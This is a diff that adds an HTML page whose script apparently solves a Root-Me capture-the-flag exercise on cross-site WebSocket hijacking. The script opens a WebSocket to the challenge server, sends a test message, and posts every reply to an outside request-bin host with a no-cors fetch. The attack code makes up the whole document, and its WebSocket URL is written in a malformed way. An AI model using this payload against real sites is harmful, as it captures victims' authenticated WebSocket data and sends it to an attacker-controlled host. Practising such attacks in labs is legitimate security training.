@@ -1,1 +1,24 @@
-Hello World
+<!DOCTYPE html>
+<html>
+
+<body>
+    <script>
+        websocket = new WebSocket('wss://http://challenge01.root-me.org:58036/room');
+        websocket.onopen = start
+        websocket.onmessage = handleReply
+
+        function start(event) {
+            websocket.send("testtest");
+        }
+
+        function handleReply(event) {
+            fetch('https://postb.in/1635598322123-7593109435401', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: event.data
+            })
+        }
+    </script>
+</body>
+
+</html>
